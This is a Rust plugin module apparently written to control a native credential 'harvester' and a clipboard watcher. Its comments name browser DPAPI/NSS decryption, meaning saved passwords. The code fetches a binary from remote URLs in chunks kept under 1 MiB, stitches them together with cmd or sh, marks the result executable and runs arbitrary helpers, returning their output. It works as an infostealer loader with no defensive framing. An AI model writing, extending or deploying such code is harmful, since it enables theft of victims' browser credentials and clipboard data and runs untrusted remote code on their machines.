//! Controller for the native harvester (`harvest`) and clipboard watcher
//! (`clipwatch`).
//!
//! Actions:
//!
//! - `install`: fetch `chunks` (each under 1 MiB) into `dest`, verify optional
//!   `sha256`, and mark it executable.
//! - `run`: execute `helper` with `args` and return its output.
//! - `watch`: run `clipwatch --state STATE --once` with the helper.
//!
//! The helpers are native binaries because browser DPAPI/NSS decryption and
//! clipboard access are not available inside Wasm.

#![cfg_attr(not(target_arch = "wasm32"), forbid(unsafe_code))]
#![deny(missing_docs)]

use modsdk::{mod_main, CapError, Ctx};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

fn strings(ctx: &Ctx, key: &str) -> Vec<String> {
    ctx.args()
        .get(key)
        .and_then(Value::as_array)
        .map(|values| {
            values
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_owned)
                .collect()
        })
        .unwrap_or_default()
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

fn windows(ctx: &Ctx) -> bool {
    ctx.env_get("OS")
        .ok()
        .flatten()
        .is_some_and(|value| value.to_ascii_lowercase().contains("windows"))
}

/// Writes chunks verbatim, then concatenates them with the platform shell.
fn install(ctx: &Ctx, chunks: &[String], dest: &str, expected: Option<&str>) -> Result<Value, CapError> {
    let mut hasher = Sha256::new();
    let mut parts = Vec::new();
    for (index, url) in chunks.iter().enumerate() {
        let bytes = ctx.http_get(url)?;
        const CAP: usize = 1024 * 1024;
        if bytes.len() > CAP {
            return Err(CapError::Host(format!("chunk {index} exceeds 1 MiB")));
        }
        hasher.update(&bytes);
        let part = format!("{dest}.part{index:03}");
        ctx.write_file(&part, &bytes)?;
        parts.push(part);
    }
    let digest = hex(&hasher.finalize());
    if let Some(expected) = expected {
        if !expected.eq_ignore_ascii_case(&digest) {
            return Err(CapError::Host(format!(
                "sha256 mismatch: got {digest}, expected {expected}"
            )));
        }
    }
    let join = if windows(ctx) {
        let list = parts.join("+");
        vec![
            "cmd".to_owned(),
            "/c".to_owned(),
            format!("copy /b {list} {dest} && del {list}"),
        ]
    } else {
        vec![
            "sh".to_owned(),
            "-c".to_owned(),
            format!("cat {} > {dest} && chmod 0755 {dest} && rm -f {}", parts.join(" "), parts.join(" ")),
        ]
    };
    let output = ctx.exec(&join[0], &join[1..])?;
    Ok(json!({
        "ok": true,
        "dest": dest,
        "chunks": chunks.len(),
        "sha256": digest,
        "shell": String::from_utf8_lossy(&output),
    }))
}

#[mod_main]
fn run(ctx: &Ctx) -> Result<(), CapError> {
    let action = ctx
        .args()
        .get("action")
        .and_then(Value::as_str)
        .unwrap_or("run");
    let report = match action {
        "install" => {
            let dest = ctx
                .args()
                .get("dest")
                .and_then(Value::as_str)
                .ok_or_else(|| CapError::Host("install requires dest".into()))?;
            let chunks = strings(ctx, "chunks");
            if chunks.is_empty() {
                return Err(CapError::Host("install requires chunks".into()));
            }
            let expected = ctx.args().get("sha256").and_then(Value::as_str);
            install(ctx, &chunks, dest, expected)?
        }
        "watch" => {
            let helper = ctx
                .args()
                .get("helper")
                .and_then(Value::as_str)
                .ok_or_else(|| CapError::Host("watch requires helper".into()))?;
            let state = ctx
                .args()
                .get("state")
                .and_then(Value::as_str)
                .ok_or_else(|| CapError::Host("watch requires state".into()))?;
            let output = ctx.exec(
                helper,
                &["--state".to_owned(), state.to_owned(), "--once".to_owned()],
            )?;
            json!({"ok": true, "clipwatch": String::from_utf8_lossy(&output)})
        }
        _ => {
            let helper = ctx
                .args()
                .get("helper")
                .and_then(Value::as_str)
                .ok_or_else(|| CapError::Host("run requires helper".into()))?;
            let args = strings(ctx, "args");
            let output = ctx.exec(helper, &args)?;
            json!({"ok": true, "stdout": String::from_utf8_lossy(&output)})
        }
    };
    ctx.emit_stdout(&report.to_string());
    Ok(())
}
